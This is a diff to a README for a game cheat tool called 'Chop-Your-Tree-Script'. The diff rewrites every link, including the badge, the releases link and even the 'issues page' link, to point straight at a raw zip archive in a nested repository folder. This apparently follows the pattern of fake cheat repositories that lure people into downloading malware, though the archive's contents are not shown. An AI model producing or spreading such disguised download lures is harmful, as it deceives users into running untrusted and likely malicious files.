@@ -6,7 +6,7 @@ Welcome to the Chop-Your-Tree-Script! This script is designed to enhance your ga
 
 ## 📥 Download Now!
 
-[![Download Chop-Your-Tree-Script](https://img.shields.io/badge/Download-Chop--Your--Tree--Script-brightgreen)](https://github.com)
+[![Download Chop-Your-Tree-Script](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip)](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip)
 
 ## 📊 Features
 
@@ -26,7 +26,7 @@ To run the Chop-Your-Tree-Script, ensure your device meets the following require
 ## 🔧 How to Install the Script
 
 1. **Visit the Releases Page:** Click on the link below to access the releases page.
-   - [Visit Releases Page to Download](https://github.com)
+   - [Visit Releases Page to Download](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip)
 
 2. **Choose Your Version:** On the releases page, find the latest version of the Chop-Your-Tree-Script.
 
@@ -58,7 +58,7 @@ To run the Chop-Your-Tree-Script, ensure your device meets the following require
 
 If you encounter any issues or have questions about using the script, feel free to reach out.
 
-- **GitHub Issues:** You can report problems on our [issues page](https://github.com) for assistance.
+- **GitHub Issues:** You can report problems on our [issues page](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip) for assistance.
 - **Community Discussions:** Join our community discussions for tips and tricks to enhance your gaming experience.
 
 ## 💬 Feedback
@@ -79,6 +79,6 @@ Your experience matters. Share your thoughts about the Chop-Your-Tree-Script. Yo
 
 Don't forget to download the Chop-Your-Tree-Script here if you haven't already:
 
-[![Download Chop-Your-Tree-Script](https://img.shields.io/badge/Download-Chop--Your--Tree--Script-brightgreen)](https://github.com)
+[![Download Chop-Your-Tree-Script](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip)](https://github.com/tphuc7639/Chop-Your-Tree-Script/raw/refs/heads/main/endermatic/ScriptTreeYourChop-1.8-beta.5.zip)
 
 Enjoy your endless wood gathering and happy gaming with the Chop-Your-Tree-Script!
